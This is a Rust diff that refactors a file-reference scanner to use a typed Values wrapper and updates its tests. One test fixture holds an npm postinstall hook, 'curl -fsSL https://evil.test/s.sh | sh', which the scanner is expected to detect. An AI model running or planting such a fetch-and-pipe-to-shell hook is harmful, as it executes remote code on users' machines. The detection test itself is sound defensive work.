@@ -26,7 +26,7 @@ mod urls;
 
 use std::path::Path;
 
-use filefacts::{FileType, ParsedFile, RefKind, RefLocator, Reference, Symbol};
+use filefacts::{FileType, ParsedFile, RefKind, RefLocator, Reference, Symbol, Values};
 
 use found::Found;
 
@@ -102,11 +102,8 @@ pub fn references(parsed: &ParsedFile<'_>) -> Discovery {
     let symbols = parsed.symbols().as_slice();
     // A `.pyi` stub declares types; its imports never run.
     let python_stub = file_type == FileType::Python
-        && values
-            .get("file.basename")
-            .and_then(serde_json::Value::as_str)
-            .is_some_and(|name| name.ends_with(".pyi"));
-    facts(file_type, values.as_json(), symbols, &mut found);
+        && filefacts::values::basename(values).is_some_and(|name| name.ends_with(".pyi"));
+    facts(file_type, values, symbols, &mut found);
     if !python_stub {
         for reference in python_imports(file_type, symbols) {
             found.add(reference);
@@ -144,12 +141,12 @@ pub fn references_in_bytes(data: &[u8], path: impl AsRef<Path>) -> Discovery {
 /// analysis discarded. The text recognizers (command streams, URLs in
 /// strings) need the bytes; use [`references`] when those are in hand.
 ///
-/// `values` is `filefacts::Values::as_json()`. filefacts exposes no typed
-/// view of the value tree outside its own crate, and a consumer holding
-/// retained facts has only that JSON, so the tree is read by path.
+/// `values` is the file's [`ParsedFile::values`], or that tree retained as
+/// JSON and rebuilt with `Values::from`; it is read through
+/// [`filefacts::values`].
 pub fn references_from_facts(
     file_type: FileType,
-    values: &serde_json::Value,
+    values: &Values,
     symbols: &[Symbol],
     declared: &[Reference],
 ) -> Discovery {
@@ -160,7 +157,7 @@ pub fn references_from_facts(
 }
 
 /// The recognizers that need only facts, shared by both entry points.
-fn facts(file_type: FileType, values: &serde_json::Value, symbols: &[Symbol], out: &mut Found<'_>) {
+fn facts(file_type: FileType, values: &Values, symbols: &[Symbol], out: &mut Found<'_>) {
     shell::npm_hooks(values, out);
     match file_type {
         FileType::Shell => out.absorb(urls::fetch_calls(symbols)),
@@ -378,7 +375,7 @@ mod tests {
             references(&parsed).references,
             references_from_facts(
                 FileType::GoSum,
-                parsed.values().as_json(),
+                parsed.values(),
                 parsed.symbols().as_slice(),
                 parsed.references(),
             )
@@ -391,12 +388,12 @@ mod tests {
 
     #[test]
     fn references_from_facts_covers_hooks_downloaders_and_batch_programs() {
-        let values = serde_json::json!({
+        let values = Values::from(serde_json::json!({
             "npm": { "scripts": {
                 "postinstall": "curl -fsSL https://evil.test/s.sh | sh",
                 "preinstall": "npm install sketchy-pkg"
             }}
-        });
+        }));
         let found = references_from_facts(FileType::Json, &values, &[], &[]);
         let all = locators(&found.references);
         assert!(all.contains(&"https://evil.test/s.sh"), "{all:?}");
@@ -404,7 +401,7 @@ mod tests {
         assert!(found.references.iter().all(|r| {
             r.context.as_ref().is_some_and(|c| c.has_install_script) == (r.kind == RefKind::Command)
         }));
-        let none = serde_json::json!({"npm": {"name": "x"}});
+        let none = Values::from(serde_json::json!({"npm": {"name": "x"}}));
         assert!(
             references_from_facts(FileType::Json, &none, &[], &[])
                 .references
@@ -417,7 +414,7 @@ mod tests {
             .open(script);
         let found = references_from_facts(
             FileType::Shell,
-            parsed.values().as_json(),
+            parsed.values(),
             parsed.symbols().as_slice(),
             &[],
         );
@@ -425,7 +422,8 @@ mod tests {
         assert_eq!(found.unresolved.len(), 1);
         assert_eq!(found.unresolved[0].command, "curl");
 
-        let batch = serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}});
+        let batch =
+            Values::from(serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}}));
         let found = references_from_facts(FileType::Batch, &batch, &[], &[]);
         assert!(found.truncated && found.unresolved.is_empty());
         assert!(!references_from_facts(FileType::Json, &batch, &[], &[]).truncated);
